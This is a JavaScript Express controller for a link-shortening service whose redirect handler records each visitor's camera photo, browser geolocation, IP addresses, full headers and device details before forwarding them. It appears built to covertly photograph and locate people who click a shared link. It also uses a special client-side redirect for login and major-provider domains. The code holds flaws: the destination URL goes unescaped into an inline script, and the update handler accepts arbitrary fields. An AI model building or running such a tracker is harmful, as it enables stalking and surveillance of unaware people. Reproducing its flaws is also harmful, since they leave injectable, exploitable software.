const { generateShortCode } = require("../utils/linkUtils");
const Visit = require("../models/Visit");
const Link = require("../models/Link");
const cloudinary = require("cloudinary").v2;

cloudinary.config({
  cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
  api_key: process.env.CLOUDINARY_API_KEY,
  api_secret: process.env.CLOUDINARY_API_SECRET,
});

exports.redirectLink = async (req, res) => {
  try {
    const { shortCode } = req.params;

    // Get photo and location from request body
    const { photo, timestamp, location, enableCamera, enableLocation } =
      req.body || {};

    console.log("Received request for:", shortCode);
    console.log("Request method:", req.method);
    console.log("Photo data present:", !!photo);
    console.log("Location data present:", !!location);
    console.log(
      "Requested Camera:",
      enableCamera,
      "Requested Location:",
      enableLocation
    );

    // Find the link
    const link = await Link.findOne({ shortCode }).lean();
    if (!link) {
      return res.status(404).send(`
        <html>
          <body>
            <h1>Link not found</h1>
            <p>The requested link does not exist or has been removed.</p>
          </body>
        </html>
      `);
    }

    // Ensure absolute URL (must include http/https)
    let dest = (link.originalUrl || "").trim();
    if (!/^(https?:)?\/\//i.test(dest)) {
      dest = `https://${dest.replace(/^\/+/, "")}`;
    }

    let photoUrl = null;
    let hasPhoto = false;
    let locationData = null;
    let hasLocation = false;

    // Upload photo to Cloudinary only if camera is enabled for this link AND photo is provided
    if (photo && req.method === "POST" && link.enableCamera) {
      try {
        console.log("Uploading photo to Cloudinary...");
        const base64Data = photo.replace(/^data:image\/\w+;base64,/, "");
        const uploadResult = await cloudinary.uploader.upload(
          `data:image/jpeg;base64,${base64Data}`,
          {
            folder: "link-analytics/photos",
            resource_type: "image",
            transformation: [
              { width: 400, height: 400, crop: "limit" },
              { quality: "auto:good" },
              { format: "jpg" },
            ],
          }
        );
        photoUrl = uploadResult.secure_url;
        hasPhoto = true;
        console.log("Cloudinary upload successful:", photoUrl);
      } catch (uploadError) {
        console.error("Cloudinary upload error:", uploadError);
      }
    }

    // Process location data only if location is enabled for this link AND location data is provided
    if (location && req.method === "POST" && link.enableLocation) {
      try {
        console.log("Processing location data:", location);
        locationData = {
          latitude: location.latitude,
          longitude: location.longitude,
          accuracy: location.accuracy,
          altitude: location.altitude,
          altitudeAccuracy: location.altitudeAccuracy,
          heading: location.heading,
          speed: location.speed,
          timestamp: location.timestamp
            ? new Date(location.timestamp)
            : new Date(),
          source: "browser",
        };
        hasLocation = true;
        console.log("Location data processed successfully");
      } catch (locationError) {
        console.error("Location processing error:", locationError);
      }
    }

    // --- Collect tracking info safely ---
    const t = req.trackingData || {};
    const ipInfo = t.ipInfo || {};
    const device = t.device || {};
    const headers = t.headers || req.headers || {};
    const referrer = t.referrer || req.get("referer");

    console.log("Tracking data:", {
      publicIp: ipInfo.publicIp,
      userAgent: headers["user-agent"],
      device: device.type,
      referrer: referrer,
      hasPhoto: hasPhoto,
      hasLocation: hasLocation,
      linkCameraEnabled: link.enableCamera,
      linkLocationEnabled: link.enableLocation,
    });

    // --- Save analytics & increment click count ---
    const visitData = {
      link: link._id,
      publicIp: ipInfo.publicIp,
      internalIp: ipInfo.internalIp,
      userAgent: headers["user-agent"],
      sessionId: t.sessionId,
      device: {
        type: device.type,
        os: device.os,
        browser: device.browser,
        model: device.model,
        isMobile: device.isMobile,
        isBot: device.isBot,
      },
      referrer: referrer,
      headers: headers,
      photo: photoUrl,
      hasPhoto: hasPhoto,
      location: locationData,
      hasLocation: hasLocation,
    };

    // Save tracking data (don't await to make redirect faster)
    Promise.allSettled([
      Visit.create(visitData),
      Link.updateOne({ _id: link._id }, { $inc: { clicks: 1 } }),
    ])
      .then((results) => {
        console.log("Tracking results:", results);
        console.log(
          "Successfully saved visit data and incremented click count."
        );
      })
      .catch((err) => {
        console.error("Error saving tracking data:", err);
      });

    // For sensitive domains, use meta refresh instead of HTTP redirect
    if (
      dest.includes("google.com") ||
      dest.includes("gmail.com") ||
      dest.includes("microsoft.com") ||
      dest.includes("facebook.com") ||
      dest.includes("apple.com") ||
      dest.includes("login.") ||
      dest.includes("auth.") ||
      dest.includes("account.")
    ) {
      return res.send(`
        <!DOCTYPE html>
        <html>
          <head>
            <title>Redirecting...</title>
            <meta http-equiv="refresh" content="0; url=${dest}" />
            <script>
              window.location.href = "${dest}";
            </script>
          </head>
       <body style="margin:0;padding:0;background:transparent;">
          </body>
        </html>
      `);
    }

    // For regular URLs, use HTTP redirect
    res.redirect(302, dest);
  } catch (error) {
    console.error("Redirect error:", error);
    return res.status(500).send(`
      <html>
        <body>
          <h1>Internal Server Error</h1>
          <p>Something went wrong. Please try again later.</p>
        </body>
      </html>
    `);
  }
};

exports.trackVisitOnly = async (req, res) => {
  try {
    const { shortCode } = req.params;

    // Find the link
    const link = await Link.findOne({ shortCode }).lean();
    if (!link) {
      return res.status(404).json({ error: "Link not found" });
    }

    // --- Collect tracking info safely (may be undefined) ---
    const t = req.trackingData || {};
    const ipInfo = t.ipInfo || {};
    const device = t.device || {};
    const headers = t.headers || req.headers || {};
    const referrer = t.referrer || req.get("referer");

    // --- Save analytics & increment click count ---
    const visitData = {
      link: link._id,
      publicIp: ipInfo.publicIp,
      internalIp: ipInfo.internalIp,
      userAgent: headers["user-agent"],
      sessionId: t.sessionId,
      device: {
        type: device.type,
        os: device.os,
        browser: device.browser,
        model: device.model,
        isMobile: device.isMobile,
        isBot: device.isBot,
      },
      referrer: referrer,
      headers: headers,
    };

    // Save tracking data
    await Promise.allSettled([
      Visit.create(visitData),
      Link.updateOne({ _id: link._id }, { $inc: { clicks: 1 } }),
    ]);

    console.log("Tracking-only: Successfully saved visit data");

    res.json({
      success: true,
      message: "Tracking completed successfully",
    });
  } catch (error) {
    console.error("Tracking error:", error);
    return res.status(500).json({
      success: false,
      message: "Internal server error",
    });
  }
};

exports.getLinkDestination = async (req, res) => {
  try {
    const { shortCode } = req.params;

    // Find the link but DON'T create a visit record
    const link = await Link.findOne({ shortCode }).lean();
    if (!link) {
      return res.status(404).json({ error: "Link not found" });
    }

    // Ensure absolute URL
    let dest = (link.originalUrl || "").trim();
    if (!/^(https?:)?\/\//i.test(dest)) {
      dest = `https://${dest.replace(/^\/+/, "")}`;
    }

    res.json({
      success: true,
      destinationUrl: dest,
      enableCamera: link.enableCamera || false,
      enableLocation: link.enableLocation || false,
    });
  } catch (error) {
    console.error("Get destination error:", error);
    res.status(500).json({
      success: false,
      error: "Internal server error",
    });
  }
};

// In your linkController.js - update the createLink function
exports.createLink = async (req, res) => {
  try {
    const {
      originalUrl,
      domain,
      shortCode,
      meta,
      enableCamera,
      enableLocation,
    } = req.body;

    // Validate required fields
    if (!originalUrl) {
      return res.status(400).json({ error: "Original URL is required" });
    }

    // Validate URL format
    try {
      new URL(originalUrl);
    } catch (error) {
      return res.status(400).json({ error: "Invalid URL format" });
    }

    // Validate domain is provided
    if (!domain) {
      return res.status(400).json({ error: "Domain is required" });
    }

    // Check if shortCode is provided and process it
    let finalShortCode = shortCode;

    // If no short code provided, generate one
    if (!finalShortCode || finalShortCode.trim() === "") {
      finalShortCode = generateShortCode();
    } else {
      // Process the short code - replace spaces with underscores and trim
      finalShortCode = finalShortCode.trim().replace(/\s+/g, "_");

      // Remove all character restrictions - allow any characters
      // Only check length
      if (finalShortCode.length < 1) {
        return res.status(400).json({
          error: "Short code is required",
        });
      }

      if (finalShortCode.length > 30000000) {
        return res.status(400).json({
          error: "Short code must be less than 30000000 characters",
        });
      }

      // Check if short code already exists
      const existingLink = await Link.findOne({ shortCode: finalShortCode });
      if (existingLink) {
        return res.status(400).json({ error: "Short code already exists" });
      }
    }

    const link = new Link({
      shortCode: finalShortCode,
      originalUrl,
      domain: domain, // Use the domain from the request (which comes from user's available domains)
      createdBy: req.user._id,
      meta,
      enableCamera: enableCamera || false,
      enableLocation: enableLocation || false,
    });

    await link.save();
    res.status(201).json(link);
  } catch (error) {
    if (error.code === 11000) {
      return res.status(400).json({ error: "Short code already exists" });
    }
    res.status(400).json({ error: error.message });
  }
};

// In your linkController.js - update the getUserLinks function
exports.getUserLinks = async (req, res) => {
  try {
    const links = await Link.find({ createdBy: req.user._id })
      .select(
        "originalUrl shortCode domain clicks createdAt enableCamera enableLocation"
      )
      .sort({ createdAt: -1 });

    res.json(links);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

exports.updateLink = async (req, res) => {
  try {
    const { id } = req.params;
    const updates = req.body;

    const link = await Link.findOneAndUpdate(
      { _id: id, createdBy: req.user._id },
      updates,
      { new: true }
    );

    if (!link) {
      return res.status(404).json({ error: "Link not found" });
    }

    res.json(link);
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
};

exports.deleteLink = async (req, res) => {
  try {
    const { id } = req.params;

    const link = await Link.findOneAndDelete({
      _id: id,
      createdBy: req.user._id,
    });

    if (!link) {
      return res.status(404).json({ error: "Link not found" });
    }

    await Visit.deleteMany({ link: id });
    res.json({ message: "Link deleted successfully" });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};

exports.clickLink = async (req, res) => {
  const { shortCode } = req.params;
  try {
    const link = await Link.findOne({ shortCode });

    if (!link) {
      return res.status(404).json({ error: "Link not found" });
    }

    link.clicks += 1; // Or log the click with IP and location
    await link.save();

    res.status(200).json({ message: "Click logged successfully" });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Failed to log click" });
  }
};
